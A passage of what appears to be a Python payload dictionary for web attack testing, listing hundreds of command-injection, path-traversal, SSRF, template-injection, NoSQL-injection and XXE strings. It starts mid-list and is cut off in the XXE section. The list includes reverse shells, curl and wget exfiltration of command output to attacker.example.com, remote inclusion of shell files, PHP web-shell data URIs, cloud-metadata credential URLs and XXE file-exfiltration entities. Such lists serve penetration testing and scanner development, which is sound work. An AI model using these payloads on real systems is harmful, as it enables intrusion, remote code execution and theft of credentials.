        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "`uname -a`",
        "$(uname${IFS}-a)",
        "${IFS}id",
        ";${IFS}id",
        "|${IFS}id",
        "${IFS}cat${IFS}/etc/passwd",
        "$IFS$9id",
        "$IFS$9cat$IFS$9/etc/passwd",
        "{id}",
        "id",
        "{ls,-la}",
        "{cat,/etc/passwd}",
        "{id}",
        "ca$@t /etc/passwd",
        "c'a't /etc/passwd",
        "c\"a\"t /etc/passwd",
        "/bin/c'at' /etc/passwd",
        "/???/??t /etc/passwd",
        "/???/c?t /etc/passwd",
        "/bin/cat /etc/pass*",
        "/bin/cat /etc/p?sswd",
        "l''s",
        "; python -c \"import os; os.system('id')\"",
        "; python3 -c \"import os; os.system('id')\"",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'exec(\"id\")'",
        "; php -r 'system(\"id\");'",
        "; node -e 'require(\"child_process\").exec(\"id\",function(e,s,r){process.stdout.write(s)})'",
        "; echo aWQ= | base64 -d | bash",
        "; bash -c \"{echo,aWQ=}|{base64,-d}|bash\"",
        "; echo d2hvYW1p | base64 -d | sh",
        "$(echo aWQ= | base64 -d)",
        "; $(printf '\\x69\\x64')",
        "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
        "1%3Bid",
        "1%0Aid",
        "1%0A%0Did",
        "1%26id",
        "1%7Cid",
        "1%7C%7Cid",
        "\"; id #",
        "'; id #",
        "\"; whoami #",
        "'; whoami #",
        "1`id`",
        "1$(id)",
        "a;id;a",
        "a|id|a",
        "a;a;id",
        "a|a|id",
        "& whoami",
        "| whoami",
        "&& whoami",
        "& dir",
        "| dir",
        "& ipconfig",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "& net user",
        "& net localgroup administrators",
        "& systeminfo",
        "& wmic os get caption",
        "| dir C:\\",
        "& powershell -c whoami",
        "& powershell -c Get-Process",
        "| powershell -nop -c whoami",
        "; ping -c 3 127.0.0.1",
        "; ping -n 3 127.0.0.1",
        "; curl http://127.0.0.1:1337/",
        "; curl http://127.0.0.1:1337/$(id)",
        "$(curl http://127.0.0.1:1337/$(id))",
        "; wget -q http://127.0.0.1:1337/$(id)",
        "; nslookup attacker.example.com",
        "; curl http://attacker.example.com/`id`",
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; sh -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "cat$u+/etc$u/passwd$u",
        "cat$u /etc$u/passwd$u",
        ";cat$u+/etc$u/passwd$u",
        ";+$u+cat+/etc$u/passwd$u",
        ";+$u+cat+/etc$u/passwd+\\#",
        "$u**/bin**$u**/cat**$u $u**/etc**$u**/passwd**$u",
        "/???/??t+/???/??ss??",
        "/?in/cat+/et?/passw?",
        "/???/c?t /etc/p?sswd",
        "/bin/c?t /etc/pa?swd",
        "/bi'n'''/c''at' /e'tc'/pa''ss'wd",
        "c'at' /etc/passwd",
        "ca''t /etc/passwd",
        "/bin/cat /etc/passwd$u",
        "id$u",
        "whoami$u",
        "id%00",
        "; id%00",
        "| id%00",
        "; cat $'\\x2fetc\\x2fpasswd'",
        "; $(printf '\\x63\\x61\\x74') /etc/passwd",
        "; $(printf '\\x63\\x61\\x74') $'\\x2fetc\\x2fpasswd'",
        "; {cat,/etc/passwd}",
        "; {ca,t,/etc/passwd}",
        "; X=/et;Y=c/pa;Z=sswd;cat $X$Y$Z",
        "; cat ${HOME}/../etc/passwd",
        "; /???/c?t /???/p?ss??",
        "; /b??/c?t /e??/p???wd",
        "; while IFS= read -r l; do echo $l; done </etc/passwd",
        "%0a cat /etc/passwd %0a",
        "%0d%0a cat /etc/passwd %0d%0a",
        "\\ncat /etc/passwd\\n",
        "; python3 -c '__import__(\"os\").system(\"id\")'",
        "; python3 -c \"exec(chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(105)+chr(100)+chr(39)+chr(41))\"",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'system(\"id\")'",
        "; php -r 'system(\"id\");'",
        "; $(echo 'cat /etc/passwd' | base64 -d | sh)",
        "; bash -c $(printf '%s' 'cat /etc/passwd')",
        ";${IFS}cat${IFS}/etc/passwd",
        "|\tcat\t/etc/passwd",
        "; python3 -c 'import os;print(os.popen(\"id\").read())'",
        "; python3 -c '__import__(\"os\").system(\"id\")'",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'exec(\"id\")'",
        "; node -e 'require(\"child_process\").exec(\"id\",(_,s)=>process.stdout.write(s))'",
        "; php -r 'system(\"id\");'",
        "; powershell -c whoami",
        "; powershell -enc aQBkAA==",
        "; powershell -nop -exec bypass -c \"whoami\"",
        "& { whoami }",
        "$(whoami)",
        "; c'a't /etc/passwd",
        "; c\"a\"t /etc/passwd",
        "; /b'i'n/cat /etc/passwd",
        "; {cat,/etc/passwd}",
        "; {ca,t${IFS}/etc/passwd}",
        "; X=/et;Y=c/passwd;cat ${X}${Y}",
        "; X=/et;Y=/passwd;cat ${X}c${Y}",
        "${HOME%/*}/bin/cat /etc/passwd",
        "; /???/c?t /???/p?ss??",
        "; /b??/c?t /e??/p???wd",
        "; /bin/c[a]t /etc/pa[s]swd",
        "; while IFS= read -r l; do echo \"$l\"; done </etc/passwd",
        "; mapfile -t a </etc/passwd;printf '%s\\n' \"${a[@]}\"",
        "; $(echo 'aWQ=' | base64 -d | sh)",
        "; bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)",
        "; IFS=_;cmd=cat_/etc/passwd;$cmd",
        "; IFS='\\t' eval 'cat\\t/etc/passwd'",
        "%0a id %0a",
        "%0d%0a id %0d%0a",
        "\\ncat /etc/passwd\\n",
        "; %0a cat /etc/passwd",
        "; $(printf '\\x63\\x61\\x74') /etc/passwd",
        "; $(printf '\\x63\\x61\\x74') \\x2fetc\\x2fpasswd",
        "; cat $'\\x2fetc\\x2fpasswd'",
        "; id; uname -a; whoami",
        "| id | uname -a",
        "& id & whoami",
        "&& id && whoami",
        "|| id || whoami",
    ],

    "LFI": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd\x00",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%u002f..%u002f..%u002fetc%u002fpasswd",
        "..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "....////....////....////etc/passwd",
        "..///////..////..//////etc/passwd",
        ".././.././.././etc/passwd",
        "..;/..;/..;/etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "..%5C..%5C..%5Cetc%5Cpasswd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/issue.net",
        "/etc/os-release",
        "/etc/debian_version",
        "/etc/redhat-release",
        "/etc/centos-release",
        "/etc/lsb-release",
        "/etc/fstab",
        "/etc/mtab",
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/environment",
        "/etc/profile",
        "/etc/bashrc",
        "/etc/timezone",
        "/etc/localtime",
        "/etc/resolv.conf",
        "/etc/nsswitch.conf",
        "/etc/motd",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/home/user/.ssh/id_rsa",
        "/.ssh/id_rsa",
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/net/fib_trie",
        "/proc/net/tcp",
        "/proc/sched_debug",
        "/proc/1/cmdline",
        "/proc/1/environ",
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/usr/local/apache/log/access_log",
        "/usr/local/apache2/log/access_log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/mail.log",
        "/var/log/vsftpd.log",
        "/var/log/proftpd/proftpd.log",
        "/var/log/pure-ftpd/pure-ftpd.log",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
        "/var/www/.env",
        "/.env",
        "/app/.env",
        "/config/database.yml",
        "/config/secrets.yml",
        "/config/application.yml",
        "/../../../.env",
        "/var/lib/php/sessions/sess_",
        "/tmp/sess_",
        "/tmp/session_",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=../../config.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
        "php://filter/convert.iconv.UTF-8.UNICODE/resource=index.php",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/zlib.inflate/convert.base64-encode/resource=index.php",
        "php://input",
        "php://stdin",
        "php://memory",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "data://text/plain,<?php system($_GET['cmd']); ?>",
        "expect://id",
        "expect://whoami",
        "phar://./uploads/shell.jpg",
        "zip://./uploads/shell.zip%23shell.php",
        "http://attacker.example.com/shell.txt",
        "http://attacker.example.com/shell.txt%00",
        "\\\\attacker.example.com\\share\\shell.php",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
        "C:\\boot.ini",
        "C:/boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:/inetpub/wwwroot/web.config",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\win.ini",
        "..%5C..%5C..%5CWindows%5Cwin.ini",
        "..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
        "..%255C..%255C..%255CWindows%255Cwin.ini",
        "..%u005c..%u005c..%u005cWindows%u005cwin.ini",
        "..%u2216..%u2216..%u2216Windows%u2216win.ini",
        "../../windows/win.ini",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.UTF16LE|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=index.php",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.UTF16LE|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=../../../../../etc/passwd",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7/resource=config.php",
        "glob://./var/www/html/*.php",
        "glob:///var/www/*",
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/pki/ca.crt",
        "/.docker/config.json",
        "/root/.docker/config.json",
        "/home/ubuntu/.docker/config.json",
        "/home/ubuntu/.aws/credentials",
        "/root/.aws/credentials",
        "/root/.aws/config",
        "/.aws/credentials",
        "/proc/self/cwd",
        "/proc/self/root",
        "/proc/self/exe",
        "/proc/self/loginuid",
        "/proc/net/arp",
        "/proc/sys/kernel/hostname",
        "/proc/sys/kernel/osrelease",
        "/proc/sys/net/ipv4/conf/all/forwarding",
        "/proc/1/net/fib_trie",
        "/proc/1/net/tcp6",
        "/root/.bash_history",
        "/root/.sh_history",
        "/home/www-data/.bash_history",
        "/var/spool/cron/crontabs/root",
        "/etc/ssl/private/server.key",
        "/etc/ssl/private/ssl.key",
        "/etc/apache2/ssl/server.key",
        "/etc/nginx/ssl/server.key",
        "~/.ssh/id_rsa",
        "storage/logs/laravel.log",
        "../../storage/logs/laravel.log",
        "../../../storage/logs/laravel.log",
        "bootstrap/cache/config.php",
        "var/log/prod.log",
        "var/log/dev.log",
        "app/config/parameters.yml",
        "app/config/config.yml",
        "settings.py",
        "../settings.py",
        "../../settings.py",
        "config/settings.py",
        "config/database.yml",
        "config/secrets.yml",
        "config/credentials.yml.enc",
        "db/schema.rb",
        "package.json",
        ".npmrc",
        "config/default.json",
        "config/production.json",
        "../../../../../../../opt/tomcat/conf/tomcat-users.xml",
        "../../../../tomcat/conf/tomcat-users.xml",
        "/opt/tomcat/conf/tomcat-users.xml",
        "/etc/tomcat8/tomcat-users.xml",
        "/etc/tomcat9/tomcat-users.xml",
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../wp-config.php",
        "/var/www/html/wp-config.php",
        "sites/default/settings.php",
        "../../sites/default/settings.php",
        "configuration.php",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
        "C:/inetpub/logs/LogFiles/W3SVC1/",
        "C:\\Windows\\System32\\config\\AppEvent.evt",
        "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        "C:\\Windows\\Panther\\Unattend\\Unattended.xml",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\sysprep\\sysprep.xml",
        "C:\\sysprep\\sysprep.inf",
        "C:\\WINDOWS\\php.ini",
        "C:\\php\\php.ini",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/conf.d/default.conf",
        "/etc/nginx/sites-enabled/default",
        "/etc/nginx/sites-available/default",
        "/usr/local/nginx/conf/nginx.conf",
        "/etc/apache2/apache2.conf",
        "/etc/apache2/ports.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/httpd/conf/httpd.conf",
        "/usr/local/apache2/conf/httpd.conf",
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.0/apache2/php.ini",
        "/etc/php/8.1/apache2/php.ini",
        "/etc/php/8.2/cli/php.ini",
        "/usr/local/lib/php.ini",
        "/etc/php.ini",
        "phar:///var/www/html/uploads/file.phar",
        "phar://./uploads/archive.tar/payload.php",
        "zip:///var/www/html/uploads/archive.zip#payload.php",
        "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/proc/self/fd/10",
        "/proc/self/fd/11",
        "/proc/self/fd/12",
        "/var/log/mail/error",
        "/var/log/php_errors.log",
        "/var/log/php7.4-fpm.log",
        "/var/log/php8.0-fpm.log",
        "/var/log/php-fpm/error.log",
        "/usr/local/apache/logs/access.log",
        "/usr/local/apache/logs/error.log",
        "/var/log/lighttpd/access.log",
        "/var/log/lighttpd/error.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "pHp://FilTer/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "php:expect://id",
        "php:expect://ls",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd",
        "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd",
        "..%c0%af../..%c0%af../..%c0%af../etc/passwd",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
        "..%%32%66..%%32%66..%%32%66/etc/passwd",
        "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd",
        "..%%35%63..%%35%63..%%35%63/etc/passwd",
        "../../../../../../../../etc/passwd%00.html",
        "../../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../boot.ini%00.html",
        "%00../../../../../../etc/passwd",
        "%00/etc/passwd%00",
        "%00../../../../../../etc/shadow",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/Panther/Unattend/Unattended.xml",
        "C:/Windows/debug/NetSetup.log",
        "C:/Windows/system32/config/AppEvent.Evt",
        "C:/Windows/system32/config/regback/sam",
        "C:/Windows/system32/config/regback/system",
        "C:/Windows/System32/inetsrv/config/applicationHost.config",
        "C:/inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log",
        "c:/xampp/phpMyAdmin/config.inc.php",
        "c:/wamp/bin/apache/apache2.2.22/conf/httpd.conf",
        "c:/xampp/apache/conf/httpd.conf",
    ],

    "SSRF": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:443/",
        "http://0.0.0.0/",
        "http://0/",
        "http://127.1/",
        "http://127.0.1/",
        "http://127.00.1/",
        "http://0177.0.0.1/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://2130706433:80/",
        "http://[::1]/",
        "http://[::]/",
        "http://[0:0:0:0:0:0:0:1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[::ffff:7f00:1]/",
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.0.1/",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "dict://127.0.0.1:6379/",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "ftp://127.0.0.1/",
        "sftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        "https://127.0.0.1/",
        "https://localhost/",
        "http://(1)(2)(8).(0).(0).(1)/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/openstack/",
        "http://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
        "http://kubernetes.default.svc/api/v1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
        "http://172.17.0.1:2375/v1.24/containers/json",
        "http://172.17.0.1:2376/v1.24/containers/json",
        "http://172.17.0.1:2375/version",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
        "gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$35%0D%0A",
        "gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:9200/_cat/indices",
        "http://127.0.0.1:9200/_cluster/health",
        "http://127.0.0.1:11211/",
        "http://127.0.0.1:27017/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:8500/v1/agent/self",
        "http://127.0.0.1:8200/v1/sys/health",
        "http://127.0.0.1:4040/api/tunnels",
        "http://127.0.0.1:5601/",
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://LocalHost/",
        "http://LOCALHOST/",
        "http://127.0.0.1.nip.io/",
        "http://localtest.me/",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:11211/",
        "ftp://127.0.0.1/",
    ],

    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "@(7*7)",
        "%{7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "{{2413413*4342737}}",
        "${2413413*4342737}",
        "#{2413413*4342737}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        "{{7*'7'}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}",
        "{{'id'|filter('system')}}",
        "{{['id']|map('passthru')}}",
        "{{app.request.server.get('HTTP_HOST')}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign classLoader=object?api.class.protectionDomain.classLoader>"
        "<#assign owc=classLoader.loadClass(\"freemarker.template.ObjectWrapper\")>"
        "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
        "<#assign ec=classLoader.loadClass(\"freemarker.template.utility.Execute\")>"
        "${dwf.newInstance(ec,null)(\"id\")}",
        "#set($str=$class.inspect(\"java.lang.String\").type)"
        "#set($chr=$class.inspect(\"java.lang.Character\").type)"
        "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))"
        "$ex.waitFor()"
        "#set($out=$ex.getInputStream())"
        "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        "#set($x='')"
        "#set($rt=$x.class.forName('java.lang.Runtime'))"
        "#set($ex=$rt.getRuntime().exec('id'))"
        "$ex.waitFor()"
        "#set($out=$ex.getInputStream())"
        "#foreach($i in [1..$out.available()])$x.class.forName('java.lang.String').valueOf($x.class.forName('java.lang.Character').toChars($out.read()))#end",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<% require 'open3' %><%= Open3.capture2('id')[0] %>",
        "#{system('id')}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        "{system('id')}",
        "{%import java%}{{java.lang.Runtime.getRuntime().exec('id')}}",
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
        "@(7*7)",
        "@{var x = System.Diagnostics.Process.Start(\"cmd\", \"/c id\");}",
        "${applicationScope}",
        "${pageContext.request.servletContext.classLoader.loadClass('java.lang.Runtime').getMethod('exec',''.class).invoke(pageContext.request.servletContext.classLoader.loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
        "#{7*7}",
        "T(java.lang.Runtime).getRuntime().exec('id')",
    ],

    "NoSQL Injection": [
        "[$ne]=1",
        "[$gt]=",
        "[$lt]=zzzz",
        "[$regex]=.*",
        "[$exists]=true",
        "[$type]=2",
        "[$in][]=admin",
        "[$nin][]=x",
        "[$where]=this.password.match(/.*/)//",
        "[$where]=1==1",
        "[$where]=sleep(5000)",
        "{\"$gt\": \"\"}",
        "{\"$ne\": null}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "{\"$where\": \"sleep(3000)\"}",
        "{\"username\": {\"$ne\": \"x\"}, \"password\": {\"$ne\": \"x\"}}",
        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
        "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$regex\": \".*\"}}",
        "{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}",
        "{\"$where\": \"function(){return true}\"}",
        "{\"$where\": \"function(){while(1){}}\"}",
        "{\"$where\": \"function(){return this.username=='admin'}\"}",
        "{\"username\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}}",
        "{\"$where\": \"this.x==1?true:function(){sleep(3000)}()\"}",
        "' ; sleep(3000) ; '",
        "' ; return true ; '",
        "[\"admin\",\"admin\"]",
        "true, $where: '1==1'",
        "', $where: '1==1",
        "\\r\\nSET x 1\\r\\n",
        "\\r\\nFLUSHALL\\r\\n",
        "\\r\\nINFO\\r\\n",
        "{\"query\":{\"match_all\":{}}}",
        "{\"query\":{\"bool\":{\"must\":[{\"match_all\":{}}]}}}",
    ],

    "XXE": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://YOUR.BURP.COLLABORATOR.HOST/\"> %xxe; ]><foo>test</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///dev/null?%file;'>\"> %eval; %exfil; ]><foo>test</foo>",
